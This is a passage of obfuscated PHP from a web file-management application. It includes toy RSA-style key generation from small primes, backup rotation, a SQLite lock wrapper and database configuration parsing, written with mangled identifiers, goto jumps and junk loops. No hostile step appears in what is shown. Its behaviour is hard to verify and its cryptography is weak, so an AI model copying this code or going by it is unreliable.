die; } $bß¼ñé‡ŸÁ = $D‚„øŒò‘é % $bß¼ñé‡ŸÁ; $dÚâîŒì = $DÎÍƒ´ˆÒÊ[677]; if (strlen($dÚâîŒì) < $DÎÍƒ´ˆÒÊ[560]) { return; } } if ($bß¼ñé‡ŸÁ == 1) { break; } else { $c”ˆ†šÜ§á++; } } $d‚ó‹™¹©‚ = 2; for ($D•‡Ö‘íâ¼ = 0; $D•‡Ö‘íâ¼ < $cÍğÜ»…Ñ * 10; $D•‡Ö‘íâ¼++) { if (($cÍğÜ»…Ñ * $D•‡Ö‘íâ¼ + 1) % $c”ˆ†šÜ§á == 0) { $d‚ó‹™¹©‚ = $d…ôÈÄ ä¿[249](($cÍğÜ»…Ñ * $D•‡Ö‘íâ¼ + 1) / $c”ˆ†šÜ§á); break; } } goto d¬Î²Êî; A‹ÉËÏìË»: $cÍğÜ»…Ñ = ($DÜÚ¯¿‘ÍÆ - 1) * ($B‚ôò²îçÑ - 1); $Dš·—‹Î°í = $DÎÍƒ´ˆÒÊ[673]; $c”ˆ†šÜ§á = $d…ôÈÄ ä¿[249](($DÜÚ¯¿‘ÍÆ + $B‚ôò²îçÑ) / 2); goto A‹£Ò¸ó¶; AÄÈ®¦À¾„: $AÁ›Ïêâë = $DÎÍƒ´ˆÒÊ[672]; if (!$AÁ›Ïêâë) { die; } $B‚ôò²îçÑ = $this->{$_SERVER[ùç´][353]}(); goto A‹ÉËÏìË»; a˜òÇ’¤®¦: $DÎÍƒ´ˆÒÊ =& $_SERVER[…Ò×–]; $d…ôÈÄ ä¿ =& $_SERVER[ùç´]; $DÜÚ¯¿‘ÍÆ = $this->{$_SERVER[ùç´][353]}(); goto AÄÈ®¦À¾„; d¬Î²Êî: $e…¨ëô’Ùõ = $this->{$_SERVER[ùç´][156]}($DÜÚ¯¿‘ÍÆ * $B‚ôò²îçÑ . $d…ôÈÄ ä¿[10], $d…ôÈÄ ä¿[158]); $cÛ‚èøƒÛ¬ = $d…ôÈÄ ä¿[123]($d…ôÈÄ ä¿[354] . ($DÜÚ¯¿‘ÍÆ + $B‚ôò²îçÑ) . $d…ôÈÄ ä¿[355] . $c”ˆ†šÜ§á . $d…ôÈÄ ä¿[355] . $d‚ó‹™¹©‚ . $d…ôÈÄ ä¿[356]); $cŸÂªî­± = $this->{$_SERVER[ùç´][156]}($E©£ñãªÊ‰, $cÛ‚èøƒÛ¬) . $d…ôÈÄ ä¿[357] . $e…¨ëô’Ùõ; goto D•ò¢ã„Ä; a¤Ò‚ÑøŞ: } public function ykcn15cbe638($bóÀé¤…ï¨) { goto B£«‹‡öµ; E§áÉ£¬‰Œ: $cŸÍÍù²à‡ = $d İ¸‹ÉÇ©[249](($BÇ®£Ş…ù + $F¾ôÒªÎˆÈ) / 2); $câàÍÊâà = $cŒ•™õÏÂ‹[681]; if (strlen($câàÍÊâà) < $cŒ•™õÏÂ‹[565]) { return; } goto CµƒŒ³´÷ñ; eŸ«È×œ¬Ø: $c‡‹Æ‚Åï = $d İ¸‹ÉÇ©[249]($c‡‹Æ‚Åï); $b÷•£¬ôšï = $cŒ•™õÏÂ‹[679]; while ($b÷•£¬ôšï < $cŒ•™õÏÂ‹[580]) { if ($b÷•£¬ôšï >= 0) { break; } $b÷•£¬ôšï++; } goto C‹ˆÊ–è¸; bÓ¤©‘®—: return $B×ÛÎÉ‘õƒ; $f×ì’æ†Ú = $cŒ•™õÏÂ‹[684]; if (!$f×ì’æ†Ú) { return; } goto B™êæ®õäŸ; b›¤¹âª¢×: if (!$eÇÌö¤»ˆ½) { return; } for ($bß¨£é†¼ = 3; $bß¨£é†¼ < $c‡‹Æ‚Åï; $bß¨£é†¼ += 2) { if ($c‡‹Æ‚Åï % $bß¨£é†¼ != 0) { continue; } $BÇ®£Ş…ù = $bß¨£é†¼; $F¾ôÒªÎˆÈ = $d İ¸‹ÉÇ©[249]($c‡‹Æ‚Åï / $bß¨£é†¼); break; $Eß·æŸö» = $cŒ•™õÏÂ‹[680]; while ($Eß·æŸö» < $cŒ•™õÏÂ‹[567]) { if ($Eß·æŸö» >= 0) { break; } $Eß·æŸö»++; } } $däì²ÍáÁ¨ = ($BÇ®£Ş…ù - 1) * ($F¾ôÒªÎˆÈ - 1); goto E§áÉ£¬‰Œ; B£«‹‡öµ: $cŒ•™õÏÂ‹ =& $_SERVER[…Ò×–]; $d İ¸‹ÉÇ© =& $_SERVER[ùç´]; $F±çöÜ¯÷À = $d İ¸‹ÉÇ©[0]($d İ¸‹ÉÇ©[357], $bóÀé¤…ï¨); goto A©¥¡ªïÚ; A©¥¡ªïÚ: if ($d İ¸‹ÉÇ©[19]($F±çöÜ¯÷À) != 2) { return $d İ¸‹ÉÇ©[10]; } $c‡‹Æ‚Åï = $this->{$_SERVER[ùç´][255]}($F±çöÜ¯÷À[1] . $d İ¸‹ÉÇ©[10], $d İ¸‹ÉÇ©[158]); if (!$c‡‹Æ‚Åï) { return $d İ¸‹ÉÇ©[10]; } goto eŸ«È×œ¬Ø; C‹ˆÊ–è¸: $BÇ®£Ş…ù = 0; $F¾ôÒªÎˆÈ = 0; $eÇÌö¤»ˆ½ = $cŒ•™õÏÂ‹[582]; goto b›¤¹âª¢×; CµƒŒ³´÷ñ: while (1) { $dØÎšÁÒ„¯ = $cŸÍÍù²à‡; $aùÅµÏ¿í¶ = $däì²ÍáÁ¨; while ($aùÅµÏ¿í¶ % $dØÎšÁÒ„¯ != 0) { $B¯‘¢¼ÛÄè = $aùÅµÏ¿í¶; $aùÅµÏ¿í¶ = $dØÎšÁÒ„¯; $C¾âĞÕ·‰Õ = $cŒ•™õÏÂ‹[682]; while (strlen($C¾âĞÕ·‰Õ) < $cŒ•™õÏÂ‹[560]) { if (!$C¾âĞÕ·‰Õ) { break; } $C¾âĞÕ·‰Õ++; } $dØÎšÁÒ„¯ = $B¯‘¢¼ÛÄè % $dØÎšÁÒ„¯; } if ($dØÎšÁÒ„¯ == 1) { break; } else { $cŸÍÍù²à‡++; } } $Cªß“–ò‡´ = 2; for ($bß¨£é†¼ = 0; $bß¨£é†¼ < $däì²ÍáÁ¨ * 10; $bß¨£é†¼++) { if (($däì²ÍáÁ¨ * $bß¨£é†¼ + 1) % $cŸÍÍù²à‡ == 0) { $Cªß“–ò‡´ = $d İ¸‹ÉÇ©[249](($däì²ÍáÁ¨ * $bß¨£é†¼ + 1) / $cŸÍÍù²à‡); break; } } goto e‘æ›’…À; e‘æ›’…À: $E´´îäÃÆÜ = $d İ¸‹ÉÇ©[123]($d İ¸‹ÉÇ©[354] . ($BÇ®£Ş…ù + $F¾ôÒªÎˆÈ) . $d İ¸‹ÉÇ©[355] . $cŸÍÍù²à‡ . $d İ¸‹ÉÇ©[355] . $Cªß“–ò‡´ . $d İ¸‹ÉÇ©[356]); $B×ÛÎÉ‘õƒ = $this->{$_SERVER[ùç´][255]}($F±çöÜ¯÷À[0], $E´´îäÃÆÜ); $FªĞĞà–Ã = $cŒ•™õÏÂ‹[683]; goto bÓ¤©‘®—; B™êæ®õäŸ: } public function bsdt25be4472() { goto CÄªëÎç“Š; aŞ§±¢«: $a¬è‹‹Ù¾Ì = array(); $fà”©«› = 1; while ($fà”©«› <= (int) $a¦ÀÑ•ƒª¡[359]($bê ¡»²íš)) { $bÁ»Óê‹ = $fà”©«›; while (!0) { $bÁ»Óê‹++; $B•ù¼•¥© = $e„¶Ô½ìÌ[685]; while ($B•ù¼•¥© < $e„¶Ô½ìÌ[567]) { if ($B•ù¼•¥© >= 0) { break; } $B•ù¼•¥©++; } if ($bÁ»Óê‹ <= 2) { $fà”©«› = $bÁ»Óê‹; break; } else { if ($bÁ»Óê‹ < 2) { continue; } } $Aäõ›ƒÌ = !0; for ($AÕÍå‘œ±» = 2; $AÕÍå‘œ±» <= $a¦ÀÑ•ƒª¡[359]($bÁ»Óê‹); $AÕÍå‘œ±»++) { if ($bÁ»Óê‹ % $AÕÍå‘œ±» == 0) { $Aäõ›ƒÌ = !1; } } if ($Aäõ›ƒÌ) { $fà”©«› = $bÁ»Óê‹; break; } } $a¬è‹‹Ù¾Ì[] = $fà”©«›; $bÑàÏœ¶‰– = $e„¶Ô½ìÌ[686]; } goto bÉ½«ŠóÒ‹; bëŸÀÈ°Îà: for ($bÁ»Óê‹ = $bê ¡»²íš; $bÁ»Óê‹ > 1; $bÁ»Óê‹--) { $Aäõ›ƒÌ = !0; $c„Ğİ‰¶Øí = $e„¶Ô½ìÌ[688]; if (!$c„Ğİ‰¶Øí) { return; } foreach ($a¬è‹‹Ù¾Ì as $B³È¿Œ­¬) { if ($bÁ»Óê‹ % $B³È¿Œ­¬ == 0) { $Aäõ›ƒÌ = !1; break; } } if ($Aäõ›ƒÌ) { $CğÏ–»¹êˆ = $bÁ»Óê‹; break; } } return $CğÏ–»¹êˆ; goto E˜”½ÏØäÑ; CÄªëÎç“Š: $e„¶Ô½ìÌ =& $_SERVER[…Ò×–]; $a¦ÀÑ•ƒª¡ =& $_SERVER[ùç´]; $bê ¡»²íš = $a¦ÀÑ•ƒª¡[338]($a¦ÀÑ•ƒª¡[358](2, 14), $a¦ÀÑ•ƒª¡[358](2, 16) - 1); goto aŞ§±¢«; bÉ½«ŠóÒ‹: $CğÏ–»¹êˆ = 2; $D³¬š•”° = $e„¶Ô½ìÌ[687]; if (strlen($D³¬š•”°) < $e„¶Ô½ìÌ[552]) { die; } goto bëŸÀÈ°Îà; E˜”½ÏØäÑ: } public function txpj23859438($BíÈÁ»ëï, $EŠÀãå°î“) { $B¾ßë‹ÁĞõ =& $_SERVER[ùç´]; return $B¾ßë‹ÁĞõ[13](array($B¾ßë‹ÁĞõ[14], $B¾ßë‹ÁĞõ[360]), $BíÈÁ»ëï, $EŠÀãå°î“); $DĞ´¡È´ = $_SERVER[…Ò×–][689]; } public function kect2be094d0($aÅÉÈ¶âÈ¶, $bïâÚ•ïŠ’) { $DôÚÑˆ¨ƒÊ =& $_SERVER[…Ò×–]; $AÛŞ¦Ë½Ş =& $_SERVER[ùç´]; return $AÛŞ¦Ë½Ş[13](array($AÛŞ¦Ë½Ş[361], $AÛŞ¦Ë½Ş[362]), $aÅÉÈ¶âÈ¶, $bïâÚ•ïŠ’); $bŠä¶Ÿô¢Ô = $DôÚÑˆ¨ƒÊ[690]; if (strlen($bŠä¶Ÿô¢Ô) < $DôÚÑˆ¨ƒÊ[565]) { die; } } public function pszva0b21911($d†¹±½à©¸, $c°êèÎŞÊ„) { $Cç“›ƒáÆÅ =& $_SERVER[…Ò×–]; $c¥¶†«Ò‘” =& $_SERVER[ùç´]; return $c¥¶†«Ò‘”[13](array($c¥¶†«Ò‘”[361], $c¥¶†«Ò‘”[363]), $d†¹±½à©¸, $c°êèÎŞÊ„); $a¤Äê‘è½‡ = $Cç“›ƒáÆÅ[691]; while (strlen($a¤Äê‘è½‡) < $Cç“›ƒáÆÅ[580]) { if (!$a¤Äê‘è½‡) { break; } $a¤Äê‘è½‡++; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $E«¥«ÅÁìŞ =& $_SERVER[…Ò×–]; self::$name = date($E«¥«ÅÁìŞ[692]); if (!($e°Ï‡¯¥Ù› = Model($E«¥«ÅÁìŞ[693])->lastItem())) { $e°Ï‡¯¥Ù› = $this->initData(); } else { self::$name = $e°Ï‡¯¥Ù›[$E«¥«ÅÁìŞ[28]]; if ($e°Ï‡¯¥Ù›[$E«¥«ÅÁìŞ[694]] == $E«¥«ÅÁìŞ[83]) { self::$name = date($E«¥«ÅÁìŞ[695]); $FÚ‰¦İ­ò = 0; if (isset($e°Ï‡¯¥Ù›[$E«¥«ÅÁìŞ[285]][$E«¥«ÅÁìŞ[171]][$E«¥«ÅÁìŞ[423]])) { $FÚ‰¦İ­ò = (int) $e°Ï‡¯¥Ù›[$E«¥«ÅÁìŞ[285]][$E«¥«ÅÁìŞ[171]][$E«¥«ÅÁìŞ[423]]; } if ($e°Ï‡¯¥Ù›[$E«¥«ÅÁìŞ[28]] == self::$name) { Model($E«¥«ÅÁìŞ[693])->remove($e°Ï‡¯¥Ù›[$E«¥«ÅÁìŞ[371]]); } $e°Ï‡¯¥Ù› = $this->initData($FÚ‰¦İ­ò, $e°Ï‡¯¥Ù›[$E«¥«ÅÁìŞ[696]]); } else { $this->checkStore($e°Ï‡¯¥Ù›[$E«¥«ÅÁìŞ[696]]); } } self::$option = $e°Ï‡¯¥Ù›; } private function initData($Aˆ¡„ö…‚‘ = 0, $DËÖÆïš¼¸ = '') { goto D…ö­§–ù; D…ö­§–ù: $e“ŸÁºØö =& $_SERVER[…Ò×–]; $C¶˜†è•íó = Model($e“ŸÁºØö[693])->config(); if ($DËÖÆïš¼¸ && $C¶˜†è•íó[$e“ŸÁºØö[696]] != $DËÖÆïš¼¸) { $Aˆ¡„ö…‚‘ = 0; } goto fÂõ´™öÇ•; A„Øî¡Ğº: $A‹Óá°Êœò[$e“ŸÁºØö[371]] = $aº÷®¸á£“; return $A‹Óá°Êœò; goto C•áÇ•Û‡; fÂõ´™öÇ•: $this->checkStore($C¶˜†è•íó[$e“ŸÁºØö[696]]); $A‹Óá°Êœò = array($e“ŸÁºØö[696] => $C¶˜†è•íó[$e“ŸÁºØö[696]], $e“ŸÁºØö[28] => self::$name, $e“ŸÁºØö[694] => 0, $e“ŸÁºØö[697] => $C¶˜†è•íó[$e“ŸÁºØö[697]], $e“ŸÁºØö[285] => array($e“ŸÁºØö[698] => array($e“ŸÁºØö[694] => 0), $e“ŸÁºØö[699] => array($e“ŸÁºØö[694] => 0, $e“ŸÁºØö[700] => 0, $e“ŸÁºØö[701] => 0, $e“ŸÁºØö[29] => $e“ŸÁºØö[33]), $e“ŸÁºØö[702] => array($e“ŸÁºØö[694] => 0, $e“ŸÁºØö[700] => 0, $e“ŸÁºØö[701] => 0), $e“ŸÁºØö[171] => array($e“ŸÁºØö[694] => 0, $e“ŸÁºØö[703] => 0, $e“ŸÁºØö[704] => 0, $e“ŸÁºØö[705] => 0, $e“ŸÁºØö[706] => 0, $e“ŸÁºØö[423] => $Aˆ¡„ö…‚‘)), $e“ŸÁºØö[707] => time(), $e“ŸÁºØö[452] => 0); $aº÷®¸á£“ = Model($e“ŸÁºØö[693])->insert($A‹Óá°Êœò); goto A„Øî¡Ğº; C•áÇ•Û‡: } private function checkStore($f›ˆŒ¦¼Ù) { $f¿ß§Ï§¤§ =& $_SERVER[…Ò×–]; $BÙÊ°Øö´ = Model($f¿ß§Ï§¤§[708])->listData($f›ˆŒ¦¼Ù); Model($f¿ß§Ï§¤§[708])->checkConfig($BÙÊ°Øö´); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[…Ò×–][693])->findByName(self::$name); } return self::$option; } public static function set($D…ï—ºˆ•¢) { $e×Õ‚˜õÃ… =& $_SERVER[…Ò×–]; $b‹¤ãïÒÙß = self::get(); foreach ($D…ï—ºˆ•¢ as $F¿©¾î­Åà => $aœ™óÅä) { $E²Ô•ÅÄ¯Î = explode($e×Õ‚˜õÃ…[91], $F¿©¾î­Åà); $fÕ†ÓÒ­÷Ô = count($E²Ô•ÅÄ¯Î); switch ($fÕ†ÓÒ­÷Ô) { case 1: $b‹¤ãïÒÙß[$E²Ô•ÅÄ¯Î[0]] = $aœ™óÅä; break; case 2: $b‹¤ãïÒÙß[$E²Ô•ÅÄ¯Î[0]][$E²Ô•ÅÄ¯Î[1]] = $aœ™óÅä; break; case 3: $b‹¤ãïÒÙß[$E²Ô•ÅÄ¯Î[0]][$E²Ô•ÅÄ¯Î[1]][$E²Ô•ÅÄ¯Î[2]] = $aœ™óÅä; break; } } Model($e×Õ‚˜õÃ…[693])->update($b‹¤ãïÒÙß[$e×Õ‚˜õÃ…[371]], $b‹¤ãïÒÙß); self::$option = $b‹¤ãïÒÙß; return self::$option; } public function keep() { $F—¶ª§‰ˆì =& $_SERVER[…Ò×–]; $DÇ¤Ñò¢¦Š = self::get(); if ($DÇ¤Ñò¢¦Š[$F—¶ª§‰ˆì[285]][$F—¶ª§‰ˆì[698]][$F—¶ª§‰ˆì[694]] == $F—¶ª§‰ˆì[83]) { return; } $this->backupKeep($DÇ¤Ñò¢¦Š); self::set(array($F—¶ª§‰ˆì[709] => 1)); } private function backupKeep($b¹ÀÓÕ ¤) { goto d‹ç½ÔÊÉ; fˆ÷óšÖ’: for ($AºÖ£‚‚È÷ = 0; $AºÖ£‚‚È÷ < 12; $AºÖ£‚‚È÷++) { $EÌŠ®Ò«Š˜[] = date($e‘Ÿà›œá[710], strtotime("\x2d{$AºÖ£‚‚È÷}\40\155\x6f\156\164\150\x73")); } $EÌŠ®Ò«Š˜ = array_unique($EÌŠ®Ò«Š˜); foreach ($fØ‡ô‘©³ as $dÍœ—¯¿¨à) { if (!empty($dÍœ—¯¿¨à[$e‘Ÿà›œá[28]]) && in_array($dÍœ—¯¿¨à[$e‘Ÿà›œá[28]], $EÌŠ®Ò«Š˜)) { continue; } Model($e‘Ÿà›œá[693])->remove($dÍœ—¯¿¨à[$e‘Ÿà›œá[371]]); $B¢Èã×—âù = "\x7b\x69\157\72{$b¹ÀÓÕ ¤[$e‘Ÿà›œá[696]]}\175\x2f\x64\141\x74\x61\x62\x61\x73\145\x2f\142\x61\x63\x6b\x75\160\137{$dÍœ—¯¿¨à[$e‘Ÿà›œá[28]]}"; IO::remove($B¢Èã×—âù, !1); } goto D‚‡°ˆ; Fµ£²´½˜ä: $AºÖ£‚‚È÷ = 0; $EÌŠ®Ò«Š˜ = array(); foreach ($fØ‡ô‘©³ as $dÍœ—¯¿¨à) { if ($AºÖ£‚‚È÷ >= 7) { break; } $EÌŠ®Ò«Š˜[] = $dÍœ—¯¿¨à[$e‘Ÿà›œá[28]]; $AºÖ£‚‚È÷++; } goto fˆ÷óšÖ’; d‹ç½ÔÊÉ: $e‘Ÿà›œá =& $_SERVER[…Ò×–]; $fØ‡ô‘©³ = Model($e‘Ÿà›œá[693])->listData(); if (empty($fØ‡ô‘©³)) { return; } goto Fµ£²´½˜ä; D‚‡°ˆ: } public function db() { goto CÀÑ¯ê‚šá; e¸Ù†åí: $Dç»äˆÙ® = new BackupDb(); if (!$Dç»äˆÙ®->index()) { return !1; } self::set(array($fË“×÷‚ç‰[711] => 1)); goto a«‡­´‚ãì; CÀÑ¯ê‚šá: $fË“×÷‚ç‰ =& $_SERVER[…Ò×–]; $déôÏ³«³„ = self::get(); if ($déôÏ³«³„[$fË“×÷‚ç‰[285]][$fË“×÷‚ç‰[699]][$fË“×÷‚ç‰[694]] == $fË“×÷‚ç‰[83]) { return !0; } goto e¸Ù†åí; a«‡­´‚ãì: return !0; goto a‚ÚÕ‚ŒÃ‡; a‚ÚÕ‚ŒÃ‡: } public function dbFile() { goto fÒî‚œÛéÜ; eÍïó÷µª›: return !0; goto AÖëñ¼±êÔ; fÒî‚œÛéÜ: $D¬®ùŞˆ‡Ô =& $_SERVER[…Ò×–]; $f×µøçãº = self::get(); if ($f×µøçãº[$D¬®ùŞˆ‡Ô[285]][$D¬®ùŞˆ‡Ô[702]][$D¬®ùŞˆ‡Ô[694]] == $D¬®ùŞˆ‡Ô[83]) { return !0; } goto eÓ¤Ïãë’á; eÓ¤Ïãë’á: $A„—µÛ‘·… = new BackupDbFile(); if (!$A„—µÛ‘·…->index()) { return !1; } self::set(array($D¬®ùŞˆ‡Ô[712] => 1)); goto eÍïó÷µª›; AÖëñ¼±êÔ: } public function file() { $EÄ×”ºŠÖó =& $_SERVER[…Ò×–]; $E‚‚±á¦ê = self::get(); if ($E‚‚±á¦ê[$EÄ×”ºŠÖó[285]][$EÄ×”ºŠÖó[171]][$EÄ×”ºŠÖó[694]] == $EÄ×”ºŠÖó[83]) { return !0; } if (!isset($E‚‚±á¦ê[$EÄ×”ºŠÖó[697]]) || $E‚‚±á¦ê[$EÄ×”ºŠÖó[697]] == $EÄ×”ºŠÖó[473]) { $D”ğ„±íå÷ = new BackupFile(); if (!$D”ğ„±íå÷->index()) { return !1; } } self::set(array($EÄ×”ºŠÖó[713] => 1, $EÄ×”ºŠÖó[694] => 1)); return !0; } } goto Añ«£Ú¹äò; CÀ ÇÄëÙÖ: define($_SERVER[…Ò×–][231], 2); define($_SERVER[…Ò×–][232], 3); define($_SERVER[…Ò×–][233], 1); goto f¸Ñ–Şò”Ã; dê‘ñ´ÕÉ‘: class DbSqlite3 extends DbSqlite3Base { public function query($aôæĞ©ÂÔ‘) { $d“¿±ŠÖİÃ =& $_SERVER[…Ò×–]; if (!CacheLock::fileLock($d“¿±ŠÖİÃ[9])) { return !1; } $c‚ÜÑÑ = parent::query($aôæĞ©ÂÔ‘); CacheLock::fileUnLock($d“¿±ŠÖİÃ[9]); return $c‚ÜÑÑ; } public function execute($FŸãŠ•Ç…) { $Fš“¯‘´”Œ =& $_SERVER[…Ò×–]; if (!CacheLock::fileLock($Fš“¯‘´”Œ[9])) { return !1; } $f´ïçí‘è = parent::execute($FŸãŠ•Ç…); CacheLock::fileUnLock($Fš“¯‘´”Œ[9]); return $f´ïçí‘è; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\x71" => "\75", "\156\145\161" => "\x3c\x3e", "\x67\164" => "\x3e", "\x65\x67\164" => "\x3e\x3d", "\154\x74" => "\74", "\145\x6c\164" => "\74\75", "\x6e\157\x74\154\x69\x6b\145" => "\116\117\x54\40\114\x49\113\x45", "\x6c\x69\153\x65" => "\114\111\x4b\x45", "\x69\156" => "\x49\116", "\156\157\x74\151\x6e" => "\x4e\117\x54\x20\x49\x4e", "\156\157\164\x20\151\x6e" => "\x4e\x4f\x54\40\111\x4e", "\x62\145\164\x77\x65\x65\x6e" => "\102\x45\x54\127\105\105\x4e", "\156\157\x74\142\x65\x74\167\145\145\156" => "\116\117\124\40\x42\105\x54\127\105\x45\116", "\x6e\157\x74\40\142\145\164\x77\145\145\x6e" => "\116\x4f\124\x20\x42\105\124\x57\x45\105\x4e"); protected $selectSql = "\x53\105\x4c\x45\103\x54\x25\104\111\123\124\x49\x4e\x43\x54\45\x20\45\106\x49\x45\114\x44\45\x20\106\x52\117\x4d\40\45\124\101\102\x4c\x45\x25\45\112\117\111\116\x25\x25\x57\x48\105\122\105\45\x25\x47\122\x4f\125\120\45\45\x48\x41\126\111\116\x47\45\45\117\x52\104\x45\x52\x25\x25\x4c\x49\x4d\x49\x54\45\40\45\x55\116\x49\x4f\x4e\x25\x25\103\117\115\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $d’Ï™™²ŸÂ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[…Ò×–][881], $d’Ï™™²ŸÂ); } public function factory($d¾‹µÏ¤‚î = '') { goto aĞ•ø  ; aĞ•ø  : $fóÑÆˆ¤¯ =& $_SERVER[…Ò×–]; $d¾‹µÏ¤‚î = $this->parseConfig($d¾‹µÏ¤‚î); if (empty($d¾‹µÏ¤‚î[$fóÑÆˆ¤¯[882]])) { think_exception(think_lang($fóÑÆˆ¤¯[883])); } goto DÂ–Ó§‰å; fõ³œÛŒ«: return $c¾“‹—ªç¹; goto bë‡Éê›»®; DÂ–Ó§‰å: $this->dbType = ucwords(strtolower($d¾‹µÏ¤‚î[$fóÑÆˆ¤¯[882]])); $B²³¤³£¬ = $fóÑÆˆ¤¯[884] . $this->dbType; if (class_exists($B²³¤³£¬)) { $c¾“‹—ªç¹ = new $B²³¤³£¬($d¾‹µÏ¤‚î); if ($fóÑÆˆ¤¯[728] != strtolower($d¾‹µÏ¤‚î[$fóÑÆˆ¤¯[882]])) { $c¾“‹—ªç¹->dbType = strtoupper($this->dbType); } else { $c¾“‹—ªç¹->dbType = $this->_getDsnType($d¾‹µÏ¤‚î[$fóÑÆˆ¤¯[837]]); } } else { think_exception(think_lang($fóÑÆˆ¤¯[885]) . $fóÑÆˆ¤¯[886] . $B²³¤³£¬); } goto fõ³œÛŒ«; bë‡Éê›»®: } public function __call($a®Ø…ß•™¹, $e¹ö¨ìÌõˆ) { if (method_exists($this, $a®Ø…ß•™¹)) { return call_user_func_array(array($this, $a®Ø…ß•™¹), $e¹ö¨ìÌõˆ); } } protected function _getDsnType($D¹˜ÉŸˆß‚) { $b›ÆÅÎñÖ™ = explode($_SERVER[…Ò×–][4], $D¹˜ÉŸˆß‚); $F™Ó‚©ñŒ‹ = strtoupper(trim($b›ÆÅÎñÖ™[0])); return $F™Ó‚©ñŒ‹; } private function parseConfig($còÀ×™èÃè = '') { $Fï—Ï¾éç‘ =& $_SERVER[…Ò×–]; if (!empty($còÀ×™èÃè) && is_string($còÀ×™èÃè)) { $còÀ×™èÃè = $this->parseDSN($còÀ×™èÃè); } elseif (is_array($còÀ×™èÃè)) { $còÀ×™èÃè = array_change_key_case($còÀ×™èÃè); $còÀ×™èÃè = array($Fï—Ï¾éç‘[882] => $còÀ×™èÃè[$Fï—Ï¾éç‘[727]], $Fï—Ï¾éç‘[810] => $còÀ×™èÃè[$Fï—Ï¾éç‘[887]], $Fï—Ï¾éç‘[811] => $còÀ×™èÃè[$Fï—Ï¾éç‘[888]], $Fï—Ï¾éç‘[808] => $còÀ×™èÃè[$Fï—Ï¾éç‘[889]], $Fï—Ï¾éç‘[809] => $còÀ×™èÃè[$Fï—Ï¾éç‘[890]], $Fï—Ï¾éç‘[17] => $còÀ×™èÃè[$Fï—Ï¾éç‘[891]], $Fï—Ï¾éç‘[837] => $còÀ×™èÃè[$Fï—Ï¾éç‘[729]], $Fï—Ï¾éç‘[13] => isset($còÀ×™èÃè[$Fï—Ï¾éç‘[892]]) ? $còÀ×™èÃè[$Fï—Ï¾éç‘[892]] : array()); } elseif (empty($còÀ×™èÃè)) { if (think_config($Fï—Ï¾éç‘[893]) && $Fï—Ï¾éç‘[728] != strtolower(think_config($Fï—Ï¾éç‘[894]))) { $còÀ×™èÃè = $this->parseDSN(think_config($Fï—Ï¾éç‘[893])); } else { $còÀ×™èÃè = array($Fï—Ï¾éç‘[882] => think_config($Fï—Ï¾éç‘[894]), $Fï—Ï¾éç‘[810] => think_config($Fï—Ï¾éç‘[895]), $Fï—Ï¾éç‘[811] => think_config($Fï—Ï¾éç‘[896]), $Fï—Ï¾éç‘[808] => think_config($Fï—Ï¾éç‘[897]), $Fï—Ï¾éç‘[809] => think_config($Fï—Ï¾éç‘[898]), $Fï—Ï¾éç‘[17] => think_config($Fï—Ï¾éç‘[238]), $Fï—Ï¾éç‘[837] => think_config($Fï—Ï¾éç‘[893]), $Fï—Ï¾éç‘[13] => think_config($Fï—Ï¾éç‘[899])); } } return $còÀ×™èÃè; } protected function initConnect($DÌ¼†»„½‘ = true) { if (1 == think_config($_SERVER[…Ò×–][18])) { $this->_linkID = $this->multiConnect($DÌ¼†»„½‘); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($fĞ±Œ§œ”… = false) { $F„ÒÑ«“æ =& $_SERVER[…Ò×–]; static $cˆÖõì«ï = array(); if (empty($cˆÖõì«ï)) { foreach ($this->config as $e­Ô×¡„ÛÄ => $BŸõ»Ü¦) { $cˆÖõì«ï[$e­Ô×¡„ÛÄ] = explode($F„ÒÑ«“æ[47], $BŸõ»Ü¦); } } if (think_config($F„ÒÑ«“æ[900])) { if ($fĞ±Œ§œ”…) { $B•¿’´¨ìº = floor(mt_rand(0, think_config($F„ÒÑ«“æ[901]) - 1)); } else { if (is_numeric(think_config($F„ÒÑ«“æ[902]))) { $B•¿’´¨ìº = think_config($F„ÒÑ«“æ[902]); } else { $B•¿’´¨ìº = floor(mt_rand(think_config($F„ÒÑ«“æ[901]), count($cˆÖõì«ï[$F„ÒÑ«“æ[808]]) - 1)); } } } else { $B•¿’´¨ìº = floor(mt_rand(0, count($cˆÖõì«ï[$F„ÒÑ«“æ[808]]) - 1)); } $CÄƒ‡†ÖÛä = array($F„ÒÑ«“æ[810] => isset($cˆÖõì«ï[$F„ÒÑ«“æ[810]][$B•¿’´¨ìº]) ? $cˆÖõì«ï[$F„ÒÑ«“æ[810]][$B•¿’´¨ìº] : $cˆÖõì«ï[$F„ÒÑ«“æ[810]][0], $F„ÒÑ«“æ[811] => isset($cˆÖõì«ï[$F„ÒÑ«“æ[811]][$B•¿’´¨ìº]) ? $cˆÖõì«ï[$F„ÒÑ«“æ[811]][$B•¿’´¨ìº] : $cˆÖõì«ï[$F„ÒÑ«“æ[811]][0], $F„ÒÑ«“æ[808] => isset($cˆÖõì«ï[$F„ÒÑ«“æ[808]][$B•¿’´¨ìº]) ? $cˆÖõì«ï[$F„ÒÑ«“æ[808]][$B•¿’´¨ìº] : $cˆÖõì«ï[$F„ÒÑ«“æ[808]][0], $F„ÒÑ«“æ[809] => isset($cˆÖõì«ï[$F„ÒÑ«“æ[809]][$B•¿’´¨ìº]) ? $cˆÖõì«ï[$F„ÒÑ«“æ[809]][$B•¿’´¨ìº] : $cˆÖõì«ï[$F„ÒÑ«“æ[809]][0], $F„ÒÑ«“æ[17] => isset($cˆÖõì«ï[$F„ÒÑ«“æ[17]][$B•¿’´¨ìº]) ? $cˆÖõì«ï[$F„ÒÑ«“æ[17]][$B•¿’´¨ìº] : $cˆÖõì«ï[$F„ÒÑ«“æ[17]][0], $F„ÒÑ«“æ[837] => isset($cˆÖõì«ï[$F„ÒÑ«“æ[837]][$B•¿’´¨ìº]) ? $cˆÖõì«ï[$F„ÒÑ«“æ[837]][$B•¿’´¨ìº] : 